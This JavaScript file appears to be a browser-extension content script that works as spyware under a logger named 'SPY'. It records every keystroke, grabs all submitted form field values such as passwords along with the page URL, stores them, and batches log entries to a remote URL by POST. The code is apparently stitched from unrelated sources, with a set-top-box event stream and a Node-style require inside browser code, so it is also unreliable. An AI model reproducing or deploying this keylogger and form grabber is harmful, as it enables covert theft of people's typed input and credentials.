(function(){
    'use strict';

    /* SSE */
    var _events = ["subtitle", "pushvod", "pdl", "player", "eit", "records", "cas", "prm", "network", "storage", "system", "scanning", "avio", "hls", "respawn", "open", "error"];
    var source = new window.EventSource('/stream');

    _events.forEach(function(_event) {
        source.addEventListener(_event, function(e) {
          LOG('SSE', _event, e.data);
      }, false);
    });

    /* Keydown */
    chrome.storage.sync.get({allKeys: false}, function(settings) {
        document.addEventListener('keydown', function (e) {
            LOG('KEYDOWN' , e.keyCode);
        });
    });

    /* Log Saving */
    var time = new Date().getTime();
    var data = {};
    var shouldSave = false;
    var lastLog = time;
    data[time] = document.title + "^~^" + document.URL + "^~^";

    // Key'ed on JS timestamp
    function _log(input) {
        var now = new Date().getTime();
        if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
        data[time] += input;
        shouldSave = true;
        lastLog = now;
        console.log("[LOG] ", input);
    }


    /* Save data */
    function save() {
        if (shouldSave) {
            chrome.storage.local.set(data, function() { console.log("Saved", data); shouldSave = false; });
        }
    }

    function autoDelete() {
        chrome.storage.sync.get({autoDelete: 1337}, function(settings) {
            // Make sure to sync with delete code from viewer.js
            var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
            chrome.storage.local.get(function(logs) {
                var toDelete = [];
                for (var key in logs) {
                    if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
                      toDelete.push(key);
                  }
              }
              chrome.storage.local.remove(toDelete, function() {
                console.log(toDelete.length + " entries deleted");
            });
          });
        });
    }

    // Save data on window close
    window.onbeforeunload = function() {
        save();
        autoDelete();
    }

    // Save every second
    setInterval(function(){
        save();
    }, 1000);


    /* Form Grabber */
    function saveForm(time, data) {
        var toSave = {};
        toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
        chrome.storage.local.set(toSave, function() { console.log("Saved", data); });
    }

    chrome.storage.sync.get({formGrabber: false}, function(settings) {
        if (settings.formGrabber) {
            var forms = document.getElementsByTagName("form");
            for (var i = 0; i < forms.length; i++) {
                forms[i].addEventListener("submit", function(e) {
                    var data = {};
                    data["FormName"] = e.target.name;
                    data["FormAction"] = e.target.action;
                    data["FormElements"] = {};
                    var elements = e.target.elements;
                    for (var n = 0; n < elements.length; n++) {
                        data["FormElements"][elements[n].name] = elements[n].value;
                    }
                    saveForm(e.timeStamp, data);
                });
            }
        }
    });

    var global = require('../settings.json');

    var LEVELS = ['debug', 'info', 'warning', 'error', 'fatal'];
    var _slice = Array.prototype.slice;


    function filter(args, namespace) {
      var f = global.LOGGER_FILTERS;
      if (f && f[namespace]) { return; }
      return _slice.call(args);
    }


    function REMOTE_LOGGER(options) {
        var flush    = [],
        size     = options.batchSize || 50,
        interval = options.batchInterval || 5000,
        url      = options.url;

        function send() {
            var logs = flush.splice(0, size),
            data = JSON.stringify(logs),
            xhr  = new XMLHttpRequest();

            function done() {
                if (xhr.status >= 300) { return fail(); }
                if (flush.length) { setTimeout(send, interval); }
            }

            function fail() {
                flush.unshift.apply(flush, logs);
                setTimeout(send, interval);
            }

            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.addEventListener('load',  done, false);
            xhr.addEventListener('error', fail, false);
            xhr.send(data);
        }
        
        return function(args, namespace, level) {
            if (!url) { return; }
            var log = {
                namespace: namespace,
                level: level,
                date: new Date(),
                args: args
            };
            if (flush.push(log) === 1) {
                setTimeout(send, interval);
            }
        };
    }

    var list = {
    //    'console': CONSOLE_LOGGER,
    //    'html':    HTML_LOGGER,
    'remote':  REMOTE_LOGGER
    };

    var names = (global.LOGGER_NAME || '').split(',');
    var loggers = names.map(function(name) {
        var logger = list[name];
        return logger && logger(global.LOGGER_OPTIONS || {});
    });

    function LOGGER(namespace) {
        var logger = function() {
          if (!loggers.length) { return; }
          var args = filter(arguments, namespace);
          var levl = (this && this.LOG_LEVEL) || 'info';
          args && loggers.forEach(function(l) {
            l(args, namespace, levl);
        });
      };
      return logger;
    }

    var LOG = LOGGER('SPY');
})();